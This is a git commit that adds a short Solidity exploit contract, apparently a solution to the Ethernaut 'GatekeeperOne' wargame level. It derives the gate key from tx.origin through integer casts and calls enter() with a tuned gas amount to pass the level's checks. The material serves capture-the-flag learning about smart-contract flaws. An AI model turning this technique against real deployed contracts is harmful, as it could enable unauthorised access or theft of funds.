615c69d1dc3fb94564a86d4d12093ce6902f5ee2
ish4n10 <91148819+ish4n10@users.noreply.github.com>
2023-04-05 16:53:20 +0530

    Create GateKeeperOne.sol

---
+++ GateKeeperOne./GateKeeperOne.sol
@@ -0,0 +1,25 @@
+pragma solidity ^0.8.0;
+
+interface GateKeeperOne {
+    function enter(bytes8) external returns (bool);
+}
+      
+      // for firstKeep you just need to use another contract
+contract expl {
+	function pwn(address _t, uint gas) external {
+		GateKeeperOne t = GateKeeperOne(_t);
+                        
+                        // the checks for thirdKeep
+		uint16 third_check = uint16(uint160(tx.origin)); 
+		uint64 first_check = uint64(1 << 63) + uint64(third_check);
+		bytes8 key = bytes8(first_check);
+                
+                // we will using the amount of gas required for "enter" function hence
+                // it will be subtracted when we actually call it
+		require(gas < 8191, "gas >= 8191");
+		require(t.enter{gas: 8191 * 10 + gas}(key), "???");
+	}
+}
+
+
+
